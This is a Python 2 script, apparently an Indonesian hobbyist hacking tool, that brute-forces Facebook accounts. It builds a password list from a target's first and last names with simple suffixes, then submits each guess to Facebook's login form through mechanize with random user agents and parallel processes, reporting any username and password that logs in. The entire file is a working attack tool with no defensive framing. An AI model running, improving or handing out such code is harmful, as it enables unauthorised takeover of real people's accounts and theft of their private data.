# -*- coding UTF-8 -*-
#  Author : RizalCyberEror404
#  Tools : Geli2 Efbeh
#  Versi : 0.2

from prettytable import PrettyTable
from multiprocessing import Process
from useragents import user_agents, string1, string2
import os, sys, time, random, cookielib, mechanize
s = '\n  \033[92;1m         Suksess... \n        Password Found '
multi_dev = []
sandi = []
def Wordlist():

	try:
		print string1
		print "\033[96;1m        B U A T   W O R D L I $ T "
		print '\033[92;1m+'+'-'*38+'+' 
		nama1 = raw_input("\033[96;1m [\033[95;1m!\033[96;1m]\033[97;1m Masukkan Nama Depan Target\033[93;1m : ")
		nama2 = raw_input("\033[96;1m [\033[95;1m!\033[96;1m]\033[97;1m Masukkan Nama Belakang Target\033[93;1m : ")
		if nama1 == '' or nama2 == '':
			sys.exit("\n\033[91;1m Jangan Kosong dong Sayang!\n Kamu Keluar...")
		d = nama1.replace(' ', '').replace('  ', '')
		b = nama2.replace(' ', '').replace('  ', '')
		lis = ['123','12345','321']
		# ////////////////////////////////////////////
		for dev in lis:
			sandi.append(nama1+dev)
		for dev in lis:
			sandi.append(nama2+dev)
		sandi.append('sayang')
		sandi.append('anjing')
	except KeyboardInterrupt:

		print "\n Keluar.... "

	print " \n\033[92;1m   Suksess Membuat Wordlist..."
		

dev = mechanize.Browser()
cok = cookielib.LWPCookieJar()
dev.set_handle_robots(False)
dev.set_handle_redirect(True)
dev.set_cookiejar(cok)
dev.set_handle_equiv(True)
dev.set_handle_referer(True)
dev.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)


# DEv = open('word1.txt', 'r').readlines()
# deV = open('word2.txt', 'r').readlines()
lol = 'https://www.facebook.com/login.php?login_attempt=1'
# sandi = open('pass.txt', 'r').readlines()


def target():
	global target

	# os.system('cls' if os.name == 'nt' else 'clear')
	print string2
	user = raw_input("\033[96;1m {\033[97;1m@\033[96;1m}\033[92;1m Masukkan Username Target:\n\033[93;1m  => \033[97;1m ")
	print '+'+'-'*38+'+'
	pasw = open('user.txt', 'w')
	pasw.write(user)
	pasw.close() 
	

def br_dev1(paswq):
	usr = open('user.txt', 'r').read()
	wak = time.ctime()
	pas = paswq.replace('\n', '')
	print '\033[96;1m ' + wak + " \033[95;1m" + pas 
	dev.addheaders = [('User_agent', random.choice(user_agents))]
	url = dev.open(lol)
	dev.select_form(nr = 0)
	dev.form['email'] = usr
	dev.form['pass'] = pas
	mleb = dev.submit()
	meki = mleb.geturl()
	if meki != lol and (not 'login_attempt' in meki):
	  try:
		x = PrettyTable()
		print s
		x.add_column("\033[92;1mUsername\033[97;1m", ['\033[96;1m'+usr+'\033[97;1m'])
		x.add_column("\033[92;1mPassword\033[97;1m", ['\033[96;1m'+pas+'\033[97;1m'])
		print '\033[97;1m'
		print x
		raw_input('\n\033[96;1m  Selamat Anda Sedang Beruntung :)\n')

	  except:
	  	pass        
		
		  	
def multi():	
	for dev in sandi:
		proc = Process(target=br_dev1, args=(dev,))
		multi_dev.append(proc)
		proc.start()
	for dev in multi_dev:
		dev.join()

def brute():
	Wordlist()
	target()
	try:
		thr1 = Process(target=multi)
		thr1.start()
		thr1.join()
	except KeyboardInterrupt:
		exit('\n Keluar.... \n')

	print '\n\033[92;1m    Selesai Broo..... \n'


